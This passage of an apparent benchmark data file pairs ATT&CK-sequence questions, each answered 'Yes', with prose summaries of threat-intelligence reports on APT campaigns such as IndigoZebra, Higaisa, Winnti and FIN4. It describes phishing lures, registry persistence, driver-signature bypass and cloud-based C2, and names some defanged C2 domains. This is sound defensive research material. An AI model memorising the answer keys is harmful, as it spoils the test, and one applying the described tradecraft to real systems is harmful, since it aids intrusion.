Others: Earth Empusa also employs watering hole attacks to compromise iOS devices by injecting malicious scripts on websites that targets could potentially visit. The group uses the ScanBox framework to collect information from a website's visitors and an exploit chain framework to exploit vulnerabilities on iOS devices. In the first quarter of 2020, the exploit chain framework was upgraded to include a newer iOS exploit that can compromise iOS versions 12.3, 12.3.1, and 12.3.2.",Yes,New Android Spyware ActionSpy Revealed via Phishing Attacks from Earth Empusa - TrendLabs Security Intelligence Blog
780,20,20-Credential Access-T1056-Input Capture,"Prior to ActionSpy abusing the Android Accessibility service to collect chat logs from instant messaging applications via monitoring Accessibility events and parsing current activity contents, is it likely that users were enticed to download a malicious archive file containing ActionSpy from a phishing page disguised as a popular video app download page?","Credential Access: ActionSpy abuses the Android Accessibility service to collect chat logs from instant messaging applications by monitoring Accessibility events and parsing the current activity contents to extract information like nicknames, chat contents, and chat time.","Reconnaissance: The Earth Empusa group, also known as POISON CARP/Evil Eye, was observed using phishing attacks to deliver the ActionSpy malware. They targeted users in Tibet and Turkey before extending their scope to Taiwan. The campaign targeted victims related to Uyghurs by compromising their Android and iOS mobile devices. The group is known for using watering hole attacks, but phishing attacks have been recently observed. In April 2020, a phishing page disguised as a download page for a popular Android video application in Tibet was found, which may have been created by Earth Empusa. The page contained malicious scripts hosted on a domain belonging to the group.
Initial Access: The phishing page invited users to download a video app known to Tibetan Android users. The download link was modified to an archive file containing the Android application, which was an undocumented Android spyware named ActionSpy.
Execution: ActionSpy is an Android spyware that impersonates a legitimate Uyghur video app called Ekran. It uses VirtualApp to achieve the same appearance and features as the original app and is protected by Bangcle to evade static analysis and detection. ActionSpy collects basic device information every 30 seconds and sends it to the C&C server as a heartbeat request.
Persistence: ActionSpy prompts users to turn on its Accessibility service, claiming it is a memory garbage cleaning service. Once enabled, ActionSpy monitors Accessibility events on the device to steal chat log files from messaging apps like WeChat, QQ, WhatsApp, and Viber indirectly.
Defense Evasion: ActionSpy is protected by Bangcle to evade static analysis and detection. Its configuration, including the C&C server address, is encrypted by DES, with the decryption key generated in native code, making static analysis difficult.
Collection: ActionSpy supports modules for collecting various types of data, including device location, contacts, call logs, SMS messages, browser bookmarks, installed app info, running processes, Wi-Fi hotspots info, files on SDCard, and chat logs from WeChat, QQ, WhatsApp, and Viber.
Command and Control: All communication traffic between the C&C and ActionSpy is encrypted by RSA and transferred via HTTP. The C&C server may return commands to be performed on the compromised device.
Others: Earth Empusa also employs watering hole attacks to compromise iOS devices by injecting malicious scripts on websites that targets could potentially visit. The group uses the ScanBox framework to collect information from a website's visitors and an exploit chain framework to exploit vulnerabilities on iOS devices. In the first quarter of 2020, the exploit chain framework was upgraded to include a newer iOS exploit that can compromise iOS versions 12.3, 12.3.1, and 12.3.2.",Yes,New Android Spyware ActionSpy Revealed via Phishing Attacks from Earth Empusa - TrendLabs Security Intelligence Blog
787,200,200-Defense Evasion-T1027-Obfuscated Files or Information,"After establishing persistence by modifying the 'HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load' registry key to point to its executable, is the backdoor likely to use 'stackstrings' obfuscation to evade detection before conducting fingerprinting and reconnaissance activities using built-in Windows networking utilities?","Defense Evasion: To evade detection, the backdoor uses 'stackstrings' obfuscation to hide its persistence and C&C communication mechanisms.","Initial Access: Check Point Research identified an ongoing spear-phishing campaign targeting the Afghan government, which is part of a long-running activity by the APT group IndigoZebra, targeting Central Asia since at least 2014. The campaign involved sending emails from an employee of the President's Office in Afghanistan to the National Security Council, containing a password-protected RAR archive named 'NSC Press conference.rar'. The archive, when extracted, revealed an executable file 'NSC Press conference.exe', which acted as a dropper.
Execution: Upon execution, the dropper would open the first document on the victim's desktop to reduce suspicion and then proceed to drop and execute the backdoor 'C:\users\public\spools.exe'.
Persistence: The backdoor establishes persistence by setting the 'HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load' registry key to point to its executable, ensuring it runs when any user logs on.
Discovery: Post-infection, the threat actor conducted fingerprinting and reconnaissance, including downloading and executing a NetBIOS scanner tool, using built-in Windows networking utilities, and accessing files on the Desktop.
Command and Control: The backdoor, named BoxCaon, uses Dropbox as a C&C server, leveraging the Dropbox API with a hardcoded bearer access token to download, upload, and execute files. It creates a unique folder for the victim in the attacker-controlled Dropbox account, named after the victim's MAC address, and communicates using clear text commands.
Others: IndigoZebra APT has been active since at least 2014, targeting Central Asian countries with tools like the xCaon backdoor and its variants. The latest variant, BoxCaon, uses Dropbox for C&C communication. The operation focuses on political entities in Kyrgyzstan and Uzbekistan, with infrastructure hosted on ASN 20473 (CHOOPA) since 2019. The actor's campaigns continue to expand with new targets and toolsets. Check Point products block this attack from the initial step.",Yes,IndigoZebra APT continues to attack Central Asia with evolving tools - Check Point Research
788,200,200-Discovery-T1046-Network Service Discovery,"After the BoxCaon backdoor establishes persistence by setting the 'HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load' registry key, is it likely that the threat actor will perform fingerprinting and reconnaissance, including downloading and executing a NetBIOS scanner tool and using Windows networking utilities for network service discovery, before initiating communication with the C2 server hosted on Dropbox?","Discovery: Post-infection, the threat actor conducted fingerprinting and reconnaissance, including downloading and executing a NetBIOS scanner tool, using built-in Windows networking utilities, and accessing files on the Desktop.","Initial Access: Check Point Research identified an ongoing spear-phishing campaign targeting the Afghan government, which is part of a long-running activity by the APT group IndigoZebra, targeting Central Asia since at least 2014. The campaign involved sending emails from an employee of the President's Office in Afghanistan to the National Security Council, containing a password-protected RAR archive named 'NSC Press conference.rar'. The archive, when extracted, revealed an executable file 'NSC Press conference.exe', which acted as a dropper.
Execution: Upon execution, the dropper would open the first document on the victim's desktop to reduce suspicion and then proceed to drop and execute the backdoor 'C:\users\public\spools.exe'.
Persistence: The backdoor establishes persistence by setting the 'HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load' registry key to point to its executable, ensuring it runs when any user logs on.
Defense Evasion: To evade detection, the backdoor uses 'stackstrings' obfuscation to hide its persistence and C&C communication mechanisms.
Command and Control: The backdoor, named BoxCaon, uses Dropbox as a C&C server, leveraging the Dropbox API with a hardcoded bearer access token to download, upload, and execute files. It creates a unique folder for the victim in the attacker-controlled Dropbox account, named after the victim's MAC address, and communicates using clear text commands.
Others: IndigoZebra APT has been active since at least 2014, targeting Central Asian countries with tools like the xCaon backdoor and its variants. The latest variant, BoxCaon, uses Dropbox for C&C communication. The operation focuses on political entities in Kyrgyzstan and Uzbekistan, with infrastructure hosted on ASN 20473 (CHOOPA) since 2019. The actor's campaigns continue to expand with new targets and toolsets. Check Point products block this attack from the initial step.",Yes,IndigoZebra APT continues to attack Central Asia with evolving tools - Check Point Research
789,200,200-Discovery-T1083-File and Directory Discovery,"After the threat actor establishes persistence by modifying the 'HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load' registry key, is it likely that the threat actor will access files on the Desktop as part of file and directory discovery before communicating with the C2 server using Dropbox and creating a unique folder named after the victim's MAC address?","Discovery: Post-infection, the threat actor conducted fingerprinting and reconnaissance, including downloading and executing a NetBIOS scanner tool, using built-in Windows networking utilities, and accessing files on the Desktop.","Initial Access: Check Point Research identified an ongoing spear-phishing campaign targeting the Afghan government, which is part of a long-running activity by the APT group IndigoZebra, targeting Central Asia since at least 2014. The campaign involved sending emails from an employee of the President's Office in Afghanistan to the National Security Council, containing a password-protected RAR archive named 'NSC Press conference.rar'. The archive, when extracted, revealed an executable file 'NSC Press conference.exe', which acted as a dropper.
Execution: Upon execution, the dropper would open the first document on the victim's desktop to reduce suspicion and then proceed to drop and execute the backdoor 'C:\users\public\spools.exe'.
Persistence: The backdoor establishes persistence by setting the 'HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load' registry key to point to its executable, ensuring it runs when any user logs on.
Defense Evasion: To evade detection, the backdoor uses 'stackstrings' obfuscation to hide its persistence and C&C communication mechanisms.
Command and Control: The backdoor, named BoxCaon, uses Dropbox as a C&C server, leveraging the Dropbox API with a hardcoded bearer access token to download, upload, and execute files. It creates a unique folder for the victim in the attacker-controlled Dropbox account, named after the victim's MAC address, and communicates using clear text commands.
Others: IndigoZebra APT has been active since at least 2014, targeting Central Asian countries with tools like the xCaon backdoor and its variants. The latest variant, BoxCaon, uses Dropbox for C&C communication. The operation focuses on political entities in Kyrgyzstan and Uzbekistan, with infrastructure hosted on ASN 20473 (CHOOPA) since 2019. The actor's campaigns continue to expand with new targets and toolsets. Check Point products block this attack from the initial step.",Yes,IndigoZebra APT continues to attack Central Asia with evolving tools - Check Point Research
796,202,202-Initial Access-T1566-Phishing,"Is it likely that the Higaisa APT group will execute a JavaScript file to perform actions such as creating and executing 'd3reEW.exe', copying 'svchhast.exe' to the startup directory, and sending a POST request to a hardcoded URL after distributing malicious LNK files disguised as a Curriculum Vitae or IELTS exam results via spear-phishing?","Initial Access: The Higaisa APT group, believed to be tied to the Korean peninsula, distributed malicious LNK files within RAR archives, likely via spear-phishing. Two variants of the campaign were identified, distributed between May 12th and 31st, with the LNK files disguised as a Curriculum Vitae and IELTS exam results, or targeting product teams using zeplin.io.","Execution: Upon execution, the LNK file initiates a multi-stage attack involving several commands: copying the LNK content to a temporary directory, using 'certutil.exe' renamed to 'gosia.exe' to bypass security detection, decoding a base64 blob, decompressing content along with a decoy PDF document, and executing a JavaScript file. The JavaScript file then performs additional actions, including creating and executing 'd3reEW.exe', copying 'svchhast.exe' to the startup directory, and sending a POST request to a hardcoded URL.
Persistence: The JavaScript file involved in the attack creates 'd3reEW.exe' in a public downloads directory, executes 'svchast.exe', copies 'svchhast.exe' to the startup directory as 'officeupdate.exe', and adds 'officeupdate.exe' to scheduled tasks to maintain persistence.
Defense Evasion: The attack employs a list of commands executed by the LNK shortcut, similar to those reported in the Higasia Covid-19 campaign, with the only difference being the names of temporary files and the name of 'certutil.exe', which is renamed to 'gosia.exe' to bypass security detection.
Discovery: The JavaScript file involved in the attack creates 'd3reEW.exe' with the command 'cmd /c ipconfig' to discover IP address information.
Command and Control: The final shellcode within the attack resolves imports, allocates memory, and creates a thread to make HTTPS requests to a C&C server. However, the server was down at the time of analysis, preventing clear identification of the ultimate goal of the attack.
Others: The Higaisa APT group's activities date back to at least 2016 and include the use of Trojans such as Gh0st and PlugX, as well as mobile malware. Their targets include government officials, human rights organizations, and other entities related to North Korea. Malwarebytes Labs, with authors Hossein Jazi and Jérôme Segura, identified the attack on May 29th and stopped the LNK file execution using the Nebula business version of their software. The attack was first disclosed by Tencent Security Threat Intelligence Center in early 2019.",Yes,New LNK attack tied to Higaisa APT discovered - Malwarebytes Labs _ Malwarebytes Labs
798,202,202-Persistence-T1547-Boot or Logon Autostart Execution,"After the Higaisa APT group uses the LNK file to initiate multi-stage commands, including executing a JavaScript file as part of the attack's execution phase, is it likely the JavaScript file will copy 'svchhast.exe' to the startup directory to maintain persistence before adding 'officeupdate.exe' to scheduled tasks?","Persistence: The JavaScript file involved in the attack creates 'd3reEW.exe' in a public downloads directory, executes 'svchast.exe', copies 'svchhast.exe' to the startup directory as 'officeupdate.exe', and adds 'officeupdate.exe' to scheduled tasks to maintain persistence.","Initial Access: The Higaisa APT group, believed to be tied to the Korean peninsula, distributed malicious LNK files within RAR archives, likely via spear-phishing. Two variants of the campaign were identified, distributed between May 12th and 31st, with the LNK files disguised as a Curriculum Vitae and IELTS exam results, or targeting product teams using zeplin.io.
Execution: Upon execution, the LNK file initiates a multi-stage attack involving several commands: copying the LNK content to a temporary directory, using 'certutil.exe' renamed to 'gosia.exe' to bypass security detection, decoding a base64 blob, decompressing content along with a decoy PDF document, and executing a JavaScript file. The JavaScript file then performs additional actions, including creating and executing 'd3reEW.exe', copying 'svchhast.exe' to the startup directory, and sending a POST request to a hardcoded URL.
Defense Evasion: The attack employs a list of commands executed by the LNK shortcut, similar to those reported in the Higasia Covid-19 campaign, with the only difference being the names of temporary files and the name of 'certutil.exe', which is renamed to 'gosia.exe' to bypass security detection.
Discovery: The JavaScript file involved in the attack creates 'd3reEW.exe' with the command 'cmd /c ipconfig' to discover IP address information.
Command and Control: The final shellcode within the attack resolves imports, allocates memory, and creates a thread to make HTTPS requests to a C&C server. However, the server was down at the time of analysis, preventing clear identification of the ultimate goal of the attack.
Others: The Higaisa APT group's activities date back to at least 2016 and include the use of Trojans such as Gh0st and PlugX, as well as mobile malware. Their targets include government officials, human rights organizations, and other entities related to North Korea. Malwarebytes Labs, with authors Hossein Jazi and Jérôme Segura, identified the attack on May 29th and stopped the LNK file execution using the Nebula business version of their software. The attack was first disclosed by Tencent Security Threat Intelligence Center in early 2019.",Yes,New LNK attack tied to Higaisa APT discovered - Malwarebytes Labs _ Malwarebytes Labs
804,203,203-Initial Access-T1566-Phishing,"Is it likely that after the spear-phishing campaign targeting journalists to gain initial access, GOLDBACKDOOR will execute a Windows shortcut file masquerading as a document to run an obfuscated PowerShell script for deploying the malware?","Initial Access: On 18 March 2022, a spear-phishing campaign targeting journalists specializing in the Democratic People's Republic of Korea (DPRK) was identified. The campaign involved malicious artifacts sent from the personal email of a former director of South Korea's National Intelligence Service (NIS). One of these artifacts was a new malware sample named GOLDBACKDOOR, which was deployed through a multi-stage process designed to avoid detection by antivirus or endpoint security. The initial access was achieved by tricking users into downloading a ZIP file named 'Kang Min-chol Edits 2.zip' from a domain impersonating NK News and executing a compressed Windows shortcut within it.","Execution: The execution of GOLDBACKDOOR involved a Windows shortcut file named 'Kang Min-chol Edits 2.lnk' that masqueraded as a document and executed a PowerShell script. This script wrote and opened a decoy document before starting the deployment process of GOLDBACKDOOR. The PowerShell script then decoded and executed a second PowerShell script, which downloaded and executed a shellcode payload named Fantasy from Microsoft OneDrive.
Defense Evasion: The deployment of GOLDBACKDOOR was designed to avoid detection by antivirus or endpoint security. The attackers used a multi-stage process and obfuscated PowerShell scripts to deploy the malware. The use of a domain impersonating NK News and the padding of the LNK file with NOP bytes were also part of the evasion techniques.
Command and Control: GOLDBACKDOOR utilized cloud service providers, specifically Microsoft OneDrive and Graph APIs, for receiving actor commands and exfiltrating data. The malware provided attackers with basic remote command execution, file downloading/uploading, keylogging, and the ability to remotely uninstall.
Others: The threat actor APT37, also known as Ricochet Chollima, is assessed with medium-high confidence to be behind the GOLDBACKDOOR malware, based on technical overlaps with the malware BLUELIGHT. The campaign targeted journalists and leveraged impersonation tactics. Stairwell's analysis linked GOLDBACKDOOR to BLUELIGHT through shared development resources and methods. The malware's functionality focused on file collection and keylogging, with a list of file extensions checked by the malware provided in the report. A tracking document was also used by the attackers to gain visibility into when and where the document was opened, indicating sophisticated operational security tradecraft.",Yes,Stairwell-threat-report-The-ink-stained-trail-of-GOLDBACKDOOR
807,203,203-Command and Control-T1102-Web Service,"After evading detection through a multi-stage deployment using obfuscated PowerShell scripts, is GOLDBACKDOOR likely to utilize Microsoft OneDrive and Graph APIs for receiving commands and exfiltrating data during its Command and Control phase?","Command and Control: GOLDBACKDOOR utilized cloud service providers, specifically Microsoft OneDrive and Graph APIs, for receiving actor commands and exfiltrating data. The malware provided attackers with basic remote command execution, file downloading/uploading, keylogging, and the ability to remotely uninstall.","Initial Access: On 18 March 2022, a spear-phishing campaign targeting journalists specializing in the Democratic People's Republic of Korea (DPRK) was identified. The campaign involved malicious artifacts sent from the personal email of a former director of South Korea's National Intelligence Service (NIS). One of these artifacts was a new malware sample named GOLDBACKDOOR, which was deployed through a multi-stage process designed to avoid detection by antivirus or endpoint security. The initial access was achieved by tricking users into downloading a ZIP file named 'Kang Min-chol Edits 2.zip' from a domain impersonating NK News and executing a compressed Windows shortcut within it.
Execution: The execution of GOLDBACKDOOR involved a Windows shortcut file named 'Kang Min-chol Edits 2.lnk' that masqueraded as a document and executed a PowerShell script. This script wrote and opened a decoy document before starting the deployment process of GOLDBACKDOOR. The PowerShell script then decoded and executed a second PowerShell script, which downloaded and executed a shellcode payload named Fantasy from Microsoft OneDrive.
Defense Evasion: The deployment of GOLDBACKDOOR was designed to avoid detection by antivirus or endpoint security. The attackers used a multi-stage process and obfuscated PowerShell scripts to deploy the malware. The use of a domain impersonating NK News and the padding of the LNK file with NOP bytes were also part of the evasion techniques.
Others: The threat actor APT37, also known as Ricochet Chollima, is assessed with medium-high confidence to be behind the GOLDBACKDOOR malware, based on technical overlaps with the malware BLUELIGHT. The campaign targeted journalists and leveraged impersonation tactics. Stairwell's analysis linked GOLDBACKDOOR to BLUELIGHT through shared development resources and methods. The malware's functionality focused on file collection and keylogging, with a list of file extensions checked by the malware provided in the report. A tracking document was also used by the attackers to gain visibility into when and where the document was opened, indicating sophisticated operational security tradecraft.",Yes,Stairwell-threat-report-The-ink-stained-trail-of-GOLDBACKDOOR
812,205,205-Defense Evasion-T1211-Exploitation for Defense Evasion,"After deploying malware through malicious websites and spear phishing emails that use zero-day exploits for initial access, is it likely that Sofacy will employ old variants of their malware as a defense evasion technique before leveraging domains for command and control activities?","Defense Evasion: The report suggests that despite the use of sophisticated zero-day exploits for delivery, the attackers continue to employ old variants of their malware, indicating a possible defense evasion technique where known malware is used in conjunction with new exploits to avoid detection.","Initial Access: The CTI report from PwC indicates that the threat actor known as Sofacy has been deploying malware through malicious websites linked in spear phishing emails. These emails also attempt to phish for web-mail credentials. The report also mentions the use of zero-day exploits, specifically CVE-2015-3043 and CVE-2015-1701, for delivering the malware.
Command and Control: The report lists a number of domains that are likely related to Sofacy's activities, which are typically used for phishing and/or malware command and control. These domains are suggested for review in network logs to detect potential malicious activity.
Others: The CTI report from PwC, dated 2015-04-20 and authored by threatintelligence@uk.pwc.com, provides tactical intelligence on the activities of the threat actor Sofacy. The report includes references to recent reports by Trend Micro and FireEye, which relate to similar activities by Sofacy. PwC also offers to provide a TLP-GREEN version of the report with additional indicators for further distribution according to US-CERT's definition for TLP. The report includes an appendix with a redacted list of domains associated with Sofacy, which are used for phishing and malware command and control. The report emphasizes the importance of reviewing network logs for these domains to aid in detecting Sofacy's activities.",Yes,cto-tib-20150420-01a
814,206,206-Defense Evasion-T1553-Subvert Trust Controls,"After the Winnti sample bypasses driver verification and installs its own drivers using a Windows x64 Driver Signature Enforcement Overrider (DSEFix) for privilege escalation, is it likely to sign its attack components with a stolen digital certificate from IQ Technology for defense evasion before utilizing DNS Tunneling for Command and Control communication?","Defense Evasion: The Winnti sample used a Windows x64 Driver Signature Enforcement Overrider (DSEFix) and a vulnerable VirtualBox driver (vbox-drv.sys) to bypass driver verification and install its own drivers, evading defenses. Additionally, the malware included a previously unreported C2 technique using DNS Tunneling through a custom implementation of the iodine source code. The malware also included a stolen digital certificate from IQ Technology to sign Winnti-related attack components.","Persistence: In January 2020, QuoIntelligence detected a new Winnti sample uploaded from a German location, targeting a previously unreported German chemical company. The Winnti sample, likely developed in 2015, contained a configuration section with a string referring to the campaign name, which is the name of the chemical company. The sample included binaries such as TmPfw-RVS.dll, driver1.sys, driver2.sys, dsefix.exe, and vbox-drv.sys. The dsefix.exe is a Windows x64 Driver Signature Enforcement Overrider, using an included old, legit VirtualBox driver, both signed and exploitable, to bypass driver verification and install its own drivers. The vboxdriver is a vulnerable, correctly signed VirtualBox driver used for exploitation. The driver1.sys and driver2.sys are rootkit drivers capable of injecting and receiving specially formatted network packets, with driver2.sys supporting different versions of Windows.
Privilege Escalation: The Winnti sample contained a Windows x64 Driver Signature Enforcement Overrider (DSEFix) and a vulnerable VirtualBox driver (vbox-drv.sys) used to bypass driver verification and install its own drivers, which could potentially allow for privilege escalation.
Command and Control: The Winnti sample used DNS Tunneling for C2 communication, leveraging the iodine source code to tunnel IPv4 data through a DNS server. The malware generated subdomains with base128 encoding and appended them to the FQDN dick[.]mooo[.]com, making NULL queries to the resulting FQDN. The malware included at least 15 matching functions from the iodine DNS tunneling solution, indicating a custom wrapper for the implementation.
Others: QuoIntelligence reported a new campaign against a South Korean gaming company by the Winnti Group, using a 64-bit Winnti executable to target Gravity Co., Ltd. The malware dropper was designed to drop and load an additional encrypted payload, with the intended target being the gaming company known for Ragnarok Online. The Winnti Group, also known as APT41, BARIUM, and Blackfly, is an alleged Chinese state-sponsored umbrella organization linked through shared goals and attack resources. The group has been active since at least 2010, targeting various industries including gaming, chemical, pharmaceutical, technology, and software. The group's evolution involves the enhancement, development, and inclusion of new tools and tactics. The Winnti Group's suspected state-sponsor link to China's government suggests a continued incentive to target industries prioritized for China's economic development.",Yes,WINNTI GROUP_ Insights From the Past
817,206,206-Privilege Escalation-T1548-Abuse Elevation Control Mechanism,"After using a stolen digital certificate from IQ Technology to sign Winnti-related attack components for defense evasion, is the Winnti sample likely to bypass driver verification using a vulnerable VirtualBox driver (vbox-drv.sys) for privilege escalation before using DNS Tunneling for command and control communication?","Privilege Escalation: The Winnti sample contained a Windows x64 Driver Signature Enforcement Overrider (DSEFix) and a vulnerable VirtualBox driver (vbox-drv.sys) used to bypass driver verification and install its own drivers, which could potentially allow for privilege escalation.","Persistence: In January 2020, QuoIntelligence detected a new Winnti sample uploaded from a German location, targeting a previously unreported German chemical company. The Winnti sample, likely developed in 2015, contained a configuration section with a string referring to the campaign name, which is the name of the chemical company. The sample included binaries such as TmPfw-RVS.dll, driver1.sys, driver2.sys, dsefix.exe, and vbox-drv.sys. The dsefix.exe is a Windows x64 Driver Signature Enforcement Overrider, using an included old, legit VirtualBox driver, both signed and exploitable, to bypass driver verification and install its own drivers. The vboxdriver is a vulnerable, correctly signed VirtualBox driver used for exploitation. The driver1.sys and driver2.sys are rootkit drivers capable of injecting and receiving specially formatted network packets, with driver2.sys supporting different versions of Windows.
Defense Evasion: The Winnti sample used a Windows x64 Driver Signature Enforcement Overrider (DSEFix) and a vulnerable VirtualBox driver (vbox-drv.sys) to bypass driver verification and install its own drivers, evading defenses. Additionally, the malware included a previously unreported C2 technique using DNS Tunneling through a custom implementation of the iodine source code. The malware also included a stolen digital certificate from IQ Technology to sign Winnti-related attack components.
Command and Control: The Winnti sample used DNS Tunneling for C2 communication, leveraging the iodine source code to tunnel IPv4 data through a DNS server. The malware generated subdomains with base128 encoding and appended them to the FQDN dick[.]mooo[.]com, making NULL queries to the resulting FQDN. The malware included at least 15 matching functions from the iodine DNS tunneling solution, indicating a custom wrapper for the implementation.
Others: QuoIntelligence reported a new campaign against a South Korean gaming company by the Winnti Group, using a 64-bit Winnti executable to target Gravity Co., Ltd. The malware dropper was designed to drop and load an additional encrypted payload, with the intended target being the gaming company known for Ragnarok Online. The Winnti Group, also known as APT41, BARIUM, and Blackfly, is an alleged Chinese state-sponsored umbrella organization linked through shared goals and attack resources. The group has been active since at least 2010, targeting various industries including gaming, chemical, pharmaceutical, technology, and software. The group's evolution involves the enhancement, development, and inclusion of new tools and tactics. The Winnti Group's suspected state-sponsor link to China's government suggests a continued incentive to target industries prioritized for China's economic development.",Yes,WINNTI GROUP_ Insights From the Past
818,207,207-Reconnaissance-T1598-Phishing for Information,"After FIN4 organizes their targets using unique campaign codes for resource development, is it likely they will use spearphishing emails to target individuals with access to confidential information and capture usernames and passwords during reconnaissance?","Reconnaissance: FireEye has been tracking a group named FIN4, which targets individuals with access to confidential information about merger and acquisition (M&A) deals and major market-moving announcements, especially in the healthcare and pharmaceutical industries. FIN4 focuses on individuals such as top executives, legal counsel, consultants, and researchers. They use spearphishing emails written by native English speakers familiar with investment terminology and the inner workings of public companies to capture usernames and passwords, allowing them to view private email correspondence.","Resource Development: FIN4 organizes their targets using over 70 unique 'campaign codes' to label the origin of stolen credentials. These codes are transmitted to FIN4's command and control (C2) servers along with the stolen credentials. Examples of campaign codes include 'CEO_CFO_COO_CORPDEV', 'SCIENTISTS_AND_RESEARCH', and specific company names.
Initial Access: FIN4 employs spearphishing emails to gain initial access to their targets' information. They embed VBA macros into legitimate documents that prompt users for their Outlook credentials, which are then sent to a server controlled by the group. FIN4 also uses fake Outlook Web App (OWA) login pages to capture credentials.
Defense Evasion: FIN4 has been observed creating rules in victims' Microsoft Outlook accounts that automatically delete any emails containing words like 'hacked', 'phish', 'malware', etc. This likely prevents compromised victims from receiving replies that their email account may be compromised, buying FIN4 extra time before detection.
Credential Access: FIN4's primary method of credential access involves spearphishing emails with embedded VBA macros in legitimate documents, which prompt users to enter their Outlook credentials. These credentials are then transmitted to FIN4's C2 servers. They also use fake OWA login pages to capture user credentials.
Command and Control: FIN4 uses C2 servers to collect stolen credentials from their phishing campaigns. They have used domains such as junomaat81[.]us and lifehealthsanfrancisco2015[.]com for their C2 infrastructure. The group also relies on Tor for anonymous communication and has specific user agents that can be identified in network logs.
Others: FIN4 has been active since at least mid-2013 and continues to compromise new victims. They have targeted over 100 organizations, with approximately two-thirds being healthcare and pharmaceutical companies. The group uses their access to insider information to potentially benefit from stock price movements. FIN4's activities suggest a sustained effort to gain advance access to market-moving information, setting them apart due to the scale of their operations and their focus on key individuals' emails.",Yes,rpt-fin4
823,207,207-Command and Control-T1090-Proxy,"After transmitting stolen credentials to their C2 servers during the credential access phase, is it likely that FIN4 uses C2 servers for collecting these credentials and relies on Tor for anonymous communication during their command and control phase?",Command and Control: FIN4 uses C2 servers to collect stolen credentials from their phishing campaigns. They have used domains such as junomaat81[.]us and lifehealthsanfrancisco2015[.]com for their C2 infrastructure. The group also relies on Tor for anonymous communication and has specific user agents that can be identified in network logs.,"Reconnaissance: FireEye has been tracking a group named FIN4, which targets individuals with access to confidential information about merger and acquisition (M&A) deals and major market-moving announcements, especially in the healthcare and pharmaceutical industries. FIN4 focuses on individuals such as top executives, legal counsel, consultants, and researchers. They use spearphishing emails written by native English speakers familiar with investment terminology and the inner workings of public companies to capture usernames and passwords, allowing them to view private email correspondence.
Resource Development: FIN4 organizes their targets using over 70 unique 'campaign codes' to label the origin of stolen credentials. These codes are transmitted to FIN4's command and control (C2) servers along with the stolen credentials. Examples of campaign codes include 'CEO_CFO_COO_CORPDEV', 'SCIENTISTS_AND_RESEARCH', and specific company names.
Initial Access: FIN4 employs spearphishing emails to gain initial access to their targets' information. They embed VBA macros into legitimate documents that prompt users for their Outlook credentials, which are then sent to a server controlled by the group. FIN4 also uses fake Outlook Web App (OWA) login pages to capture credentials.
Defense Evasion: FIN4 has been observed creating rules in victims' Microsoft Outlook accounts that automatically delete any emails containing words like 'hacked', 'phish', 'malware', etc. This likely prevents compromised victims from receiving replies that their email account may be compromised, buying FIN4 extra time before detection.
Credential Access: FIN4's primary method of credential access involves spearphishing emails with embedded VBA macros in legitimate documents, which prompt users to enter their Outlook credentials. These credentials are then transmitted to FIN4's C2 servers. They also use fake OWA login pages to capture user credentials.
Others: FIN4 has been active since at least mid-2013 and continues to compromise new victims. They have targeted over 100 organizations, with approximately two-thirds being healthcare and pharmaceutical companies. The group uses their access to insider information to potentially benefit from stock price movements. FIN4's activities suggest a sustained effort to gain advance access to market-moving information, setting them apart due to the scale of their operations and their focus on key individuals' emails.",Yes,rpt-fin4
825,208,208-Execution-T1203-Exploitation for Client Execution,"After Armageddon Group uses spearphishing emails targeting Ukrainian government entities to gain initial access, is it likely that they will utilize mshta.exe to launch a VBScript for executing subsequent attack stages before maintaining persistence by modifying the registry RUN key with a malicious PE file?","Execution: Armageddon Group employed Remote Template Injection techniques using RTF and DOCX files to download subsequent stages of their attacks. They embedded OLE objects in documents that requested remote template files containing malicious code. Additionally, they used a malicious LNK file within a TAR archive to initiate an attack stage using mshta.exe, which launched a VBScript.","Initial Access: Armageddon Group initiated attacks with spearphishing emails targeting Ukrainian government entities, containing topics related to internal affairs, foreign affairs, and the conflict with Russia. These emails included attachments such as RAR, DOCX, DOCM, LNK, and SFX files, which, when executed, launched various stages of the attack.
Persistence: To maintain persistence, Armageddon Group utilized various methods, including a malicious PE file that modified the registry RUN key.
Defense Evasion: In the second stage of the attack, Armageddon Group used a malicious VBScript and abused the Telegram service to obtain the real C2 IP address, bypassing DNS.
Command and Control: Armageddon Group used Telegram channels such as 'dracarc' to communicate and potentially control compromised systems.
Others: The report includes Indicators of Compromise (IOCs) with various hashes and URLs associated with the Armageddon Group's activities. These IOCs are crucial for identifying and mitigating the threats posed by the group's cyber warfare tactics.",Yes,Beyond_Bullets_and_Bombs_An_Examination_of_Armageddon_Groups_Cyber
828,208,208-Defense Evasion-T1205-Traffic Signaling,"After employing Remote Template Injection techniques in the Execution phase through RTF and DOCX files to download subsequent stages of the attack, is it likely that Armageddon Group will abuse the Telegram service and use a malicious VBScript as part of their Defense Evasion tactics before establishing Command and Control through Telegram channels?","Defense Evasion: In the second stage of the attack, Armageddon Group used a malicious VBScript and abused the Telegram service to obtain the real C2 IP address, bypassing DNS.","Initial Access: Armageddon Group initiated attacks with spearphishing emails targeting Ukrainian government entities, containing topics related to internal affairs, foreign affairs, and the conflict with Russia. These emails included attachments such as RAR, DOCX, DOCM, LNK, and SFX files, which, when executed, launched various stages of the attack.
Execution: Armageddon Group employed Remote Template Injection techniques using RTF and DOCX files to download subsequent stages of their attacks. They embedded OLE objects in documents that requested remote template files containing malicious code. Additionally, they used a malicious LNK file within a TAR archive to initiate an attack stage using mshta.exe, which launched a VBScript.
Persistence: To maintain persistence, Armageddon Group utilized various methods, including a malicious PE file that modified the registry RUN key.
Command and Control: Armageddon Group used Telegram channels such as 'dracarc' to communicate and potentially control compromised systems.
Others: The report includes Indicators of Compromise (IOCs) with various hashes and URLs associated with the Armageddon Group's activities. These IOCs are crucial for identifying and mitigating the threats posed by the group's cyber warfare tactics.",Yes,Beyond_Bullets_and_Bombs_An_Examination_of_Armageddon_Groups_Cyber
